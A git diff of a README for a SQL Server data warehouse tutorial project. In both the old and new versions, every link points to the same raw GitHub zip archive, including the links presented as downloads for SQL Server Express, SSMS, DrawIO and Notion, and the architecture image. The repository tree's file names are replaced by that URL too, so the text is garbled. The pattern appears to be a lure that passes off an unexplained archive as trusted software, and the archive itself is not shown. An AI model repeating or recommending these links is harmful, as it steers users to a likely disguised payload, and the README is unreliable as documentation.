@@ -7,7 +7,7 @@ This project demonstrates a comprehensive data warehousing and analytics solutio
 ## 🏗️ Data Architecture
 
 The data architecture for this project follows Medallion Architecture **Bronze**, **Silver**, and **Gold** layers:
-![Data Architecture](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip)
+![Data Architecture](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip)
 
 1. **Bronze Layer**: Stores raw data as-is from the source systems. Data is ingested from CSV Files into SQL Server Database.
 2. **Silver Layer**: This layer includes data cleansing, standardization, and normalization processes to prepare data for analysis.
@@ -37,12 +37,12 @@ This project involves:
 
 Everything is for Free!
 - **[Datasets](datasets/):** Access to the project dataset (csv files).
-- **[SQL Server Express](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** Lightweight server for hosting your SQL database.
-- **[SQL Server Management Studio (SSMS)](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** GUI for managing and interacting with databases.
-- **[Git Repository](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** Set up a GitHub account and repository to manage, version, and collaborate on your code efficiently.
-- **[DrawIO](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** Design data architecture, models, flows, and diagrams.
-- **[Notion](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** Get the Project Template from Notion
-- **[Notion Project Steps](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip):** Access to All Project Phases and Tasks.
+- **[SQL Server Express](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Lightweight server for hosting your SQL database.
+- **[SQL Server Management Studio (SSMS)](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** GUI for managing and interacting with databases.
+- **[Git Repository](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Set up a GitHub account and repository to manage, version, and collaborate on your code efficiently.
+- **[DrawIO](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Design data architecture, models, flows, and diagrams.
+- **[Notion](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Get the Project Template from Notion
+- **[Notion Project Steps](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip):** Access to All Project Phases and Tasks.
 
 ---
 
@@ -72,7 +72,7 @@ Develop SQL-based analytics to deliver detailed insights into:
 
 These insights empower stakeholders with key business metrics, enabling strategic decision-making.  
 
-For more details, refer to [https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip).
+For more details, refer to [https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip](https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip).
 
 ## 📂 Repository Structure
 ```
@@ -81,12 +81,12 @@ data-warehouse-project/
 ├── datasets/                           # Raw datasets used for the project (ERP and CRM data)
 │
 ├── docs/                               # Project documentation and architecture details
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip                      # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip file shows all different techniques and methods of ETL
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip        # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip file shows the project's architecture
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip                 # Catalog of datasets, including field descriptions and metadata
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip                # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip file for the data flow diagram
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip              # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip file for data models (star schema)
-│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip           # Consistent naming guidelines for tables, columns, and files
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                      # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file shows all different techniques and methods of ETL
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip        # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file shows the project's architecture
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                 # Catalog of datasets, including field descriptions and metadata
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file for the data flow diagram
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip              # https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip file for data models (star schema)
+│   ├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip           # Consistent naming guidelines for tables, columns, and files
 │
 ├── scripts/                            # SQL scripts for ETL and transformations
 │   ├── bronze/                         # Scripts for extracting and loading raw data
@@ -95,9 +95,9 @@ data-warehouse-project/
 │
 ├── tests/                              # Test scripts and quality files
 │
-├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip                           # Project overview and instructions
+├── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                           # Project overview and instructions
 ├── LICENSE                             # License information for the repository
 ├── .gitignore                          # Files and directories to be ignored by Git
-└── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/docs/sql-data-warehouse-project_2.0.zip                    # Dependencies and requirements for the project
+└── https://raw.githubusercontent.com/2711mike/sql-data-warehouse-project/main/tests/data-sql-project-warehouse-v2.9.zip                    # Dependencies and requirements for the project
 ```
 ---
